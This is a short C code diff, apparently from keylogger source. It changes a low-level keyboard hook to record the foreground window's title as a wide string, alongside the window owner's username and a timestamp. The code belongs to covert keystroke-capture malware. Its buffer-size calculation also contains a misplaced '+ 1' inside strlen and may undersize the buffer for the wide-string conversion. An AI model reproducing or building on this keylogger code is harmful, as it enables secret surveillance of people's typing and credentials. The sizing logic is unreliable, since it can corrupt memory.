@@ -2,7 +2,7 @@
 
 extern HHOOK winHook;
 extern BOOL foregroundWindowChanged;
-extern char foregroundWindowTitle[4096];
+extern WCHAR foregroundWindowTitle[4096];
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -25,13 +25,13 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         SYSTEMTIME lt;    
         GetLocalTime(&lt);
         GetUsernameOfForegroundWindow(foregroundWindowUsername, foregroundWindowPID);
-        size_t sz = strlen("[Foreground window's user : %s][Foreground window's title : %s]\n") + strlen(foregroundWindowTitle) + strlen(foregroundWindowUsername + 1);
+        size_t sz = strlen("[Foreground window's user : %s][Foreground window's title : %s]\n") + wcslen(foregroundWindowTitle) + strlen(foregroundWindowUsername + 1);
         LPSTR toLog = malloc(sizeof(char) * sz);
         if (toLog == NULL)
             log("\n[malloc for logging failed]\n", CHAR_MODE, TRUE);
         else
         {
-            sprintf_s(toLog, sz, "[Foreground window's user : %s][Foreground window's title : %s]\n", foregroundWindowUsername,  foregroundWindowTitle);
+            sprintf_s(toLog, sz, "[Foreground window's user : %s][Foreground window's title : %ws]\n", foregroundWindowUsername,  foregroundWindowTitle);
             log(toLog, CHAR_MODE, TRUE);
             REEF(toLog);
         }
